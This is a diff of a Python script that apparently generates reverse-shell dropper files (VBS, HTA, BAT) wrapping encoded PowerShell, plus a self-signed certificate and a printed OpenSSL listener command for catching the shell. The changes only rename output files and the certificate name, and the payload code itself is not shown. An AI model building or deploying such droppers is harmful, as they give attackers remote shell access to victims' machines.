@@ -28,7 +28,7 @@ def generate_certificate(cert_file, key_file):
         print(f"{Fore.YELLOW}Generating certificate...{Style.RESET_ALL}")
         process = subprocess.Popen([
             "openssl", "req", "-new", "-newkey", "rsa:4096", "-days", "365", "-nodes",
-            "-x509", "-subj", "/CN=www.reception.recep",
+            "-x509", "-subj", "/CN=www.loveyou.local",
             "-keyout", key_file, "-out", cert_file
         ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
@@ -308,8 +308,8 @@ if __name__ == "__main__":
     # Extract the PS1 filename from the server URL
     ps1_filename = os.path.basename(urlparse(args.server).path) if args.server else "payload.ps1"
 
-    cert_file = "reception.pem"
-    key_file = "reception.key"
+    cert_file = "cert.pem"
+    key_file = "cert.key"
 
     generate_certificate(cert_file, key_file)
 
@@ -317,11 +317,11 @@ if __name__ == "__main__":
         if args.type == "vbs":
             
             save_encoded_ps1(args.ip, args.port, ps1_filename)
-            output_file = "reception_lolbas.vbs"
+            output_file = "Reverse_lolbins.vbs"
             generate_vbs_with_encoded_ps1_lolbas(args.server, output_file, ps1_filename)
     else:
         if args.type in ["bat", "vbs", "hta"] and not args.server:
-            print(f"{Fore.RED}Error: Server URL is required for BAT/VBS file generation.{Style.RESET_ALL}")
+            print(f"{Fore.RED}Error: Server URL is required for BAT/VBS/HTA file generation.{Style.RESET_ALL}")
             exit(1)
 
         
@@ -331,13 +331,13 @@ if __name__ == "__main__":
         if not args.server:
             print(f"{Fore.RED}Error: Server URL is required for HTA file generation.{Style.RESET_ALL}")
             exit(1)
-        output_file = "reception.hta"
+        output_file = "Reverser.hta"
         generate_hta_with_encoded_ps1(args.server, output_file)
     elif args.type == "bat":
-        output_file = "reception.bat"
+        output_file = "Reverser.bat"
         generate_bat_with_encoded_ps1(args.server, output_file)
     elif args.type == "vbs":
-        output_file = "reception.vbs"
+        output_file = "Reverser.vbs"
         generate_vbs_with_encoded_ps1(args.server, output_file)
 
     print(f"{Fore.CYAN}To start an OpenSSL listener, run:\n{Fore.GREEN}openssl s_server -accept {args.port} -cert {cert_file} -key {key_file} -quiet{Style.RESET_ALL}")
